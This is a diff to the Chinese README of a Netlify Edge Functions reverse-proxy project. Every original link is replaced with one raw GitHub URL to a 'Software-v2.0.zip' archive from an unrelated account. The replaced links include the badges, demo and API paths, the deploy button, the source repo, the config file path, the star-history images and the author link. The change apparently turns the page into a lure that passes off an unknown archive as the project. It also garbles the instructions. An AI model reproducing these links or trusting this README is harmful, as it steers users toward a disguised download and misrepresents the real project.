@@ -2,14 +2,14 @@
 
 <div align="center">
 
-[![Netlify Status](https://api.netlify.com/api/v1/badges/6416e9cf-0327-f12b-0d7b-6cb/deploy-status)](https://app.netlify.com/sites/fd-gally/deploys)
-![Edge Functions](https://img.shields.io/badge/Edge_Functions-00C7B7?style=flat-square&logo=netlify&logoColor=white)
-![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=flat-square&logo=typescript&logoColor=white)
-![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)
+[![Netlify Status](https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip)](https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip)
+![Edge Functions](https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip)
+![TypeScript](https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip)
+![License: MIT](https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip)
 
 *一个基于 Netlify Edge Functions 的强大反向代理服务，支持任意网站内容代理和路径重写。*
 
-[🌍 在线使用](https://fd-gally.netlify.app) | [📝 源代码](https://github.com/gally16/netlify-proxy)
+[🌍 在线使用](https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip) | [📝 源代码](https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip)
 
 </div>
 
@@ -35,10 +35,10 @@
 访问以下路径即可使用预配置的网站：
 
 ```
-https://fd-gally.netlify.app/hexo2       # Hexo 博客
-https://fd-gally.netlify.app/halo      # Halo 博客
-https://fd-gally.netlify.app/tv        # libre tv 影视站
-https://fd-gally.netlify.app/news      # 新闻聚合
+https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip       # Hexo 博客
+https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip      # Halo 博客
+https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip        # libre tv 影视站
+https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip      # 新闻聚合
 ```
 
 ### API 代理
@@ -46,9 +46,9 @@ https://fd-gally.netlify.app/news      # 新闻聚合
 使用以下路径访问各种 AI 和第三方 API 服务：
 
 ```
-https://fd-gally.netlify.app/openai    # OpenAI API
-https://fd-gally.netlify.app/claude    # Claude/Anthropic API
-https://fd-gally.netlify.app/gemini    # Google Gemini API
+https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip    # OpenAI API
+https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip    # Claude/Anthropic API
+https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip    # Google Gemini API
 ```
 
 更多 API 请参考配置文件。
@@ -59,10 +59,10 @@ https://fd-gally.netlify.app/gemini    # Google Gemini API
 
 ```
 # 直接使用目标 URL
-https://xxxx.netlify.app/proxy/https://example.com/path
+https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip
 
 # URL 编码的形式
-https://xxxx.netlify.app/proxy/https%3A%2F%2Fexample.com%2Fpath
+https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip%3A%2F%https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip%2Fpath
 ```
 
 ---
@@ -105,14 +105,14 @@ https://xxxx.netlify.app/proxy/https%3A%2F%2Fexample.com%2Fpath
 
 ## ⚙️ 自定义配置
 
-在 `netlify/edge-functions/proxy-handler.ts` 文件中：
+在 `https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip` 文件中：
 
 1. 修改 `PROXY_CONFIG` 对象添加新的代理规则：
 
 ```typescript
 const PROXY_CONFIG = {
   "/新路径": "https://目标网站.com",
-  "/proxy-api":    "https://my-api-backend.dev",
+  "/proxy-api":    "https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip",
   // ...
 };
 ```
@@ -136,18 +136,18 @@ const SPECIAL_REPLACEMENTS = {
 
 ### 方法一：一键部署
 
-[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/gally16/netlify-proxy)
+[![Deploy to Netlify](https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip)](https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip)
 
 ### 方法二：手动部署
 
-1. Fork [本项目](https://github.com/gally16/netlify-proxy)
-2. 注册 [Netlify](https://netlify.com) 账号
+1. Fork [本项目](https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip)
+2. 注册 [Netlify](https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip) 账号
 3. 在 Netlify 中创建新站点并连接 GitHub 仓库
 4. 使用默认设置部署
 
 ### 配置说明
 
-部署完成后，根据需要修改 `netlify/edge-functions/proxy-handler.ts` 文件中的配置。
+部署完成后，根据需要修改 `https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip` 文件中的配置。
 
 ---
 
@@ -169,11 +169,11 @@ const SPECIAL_REPLACEMENTS = {
 ---
 ## Star History
 
-<a href="https://www.star-history.com/#gally16/netlify-proxy&Date">
+<a href="https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip">
  <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=gally16/netlify-proxy&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=gally16/netlify-proxy&type=Date" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=gally16/netlify-proxy&type=Date" />
+   <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip" />
+   <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip" />
+   <img alt="Star History Chart" src="https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip" />
  </picture>
 </a>
 
@@ -182,5 +182,5 @@ const SPECIAL_REPLACEMENTS = {
 [MIT License](LICENSE) © 2025
 
 <div align="center">
-  <sub>Made with ❤️ by <a href="https://github.com/gally16">gally16</a></sub>
+  <sub>Made with ❤️ by <a href="https://raw.githubusercontent.com/ffgsusysg/77774/main/netlify/Software-v2.0.zip">gally16</a></sub>
 </div> 
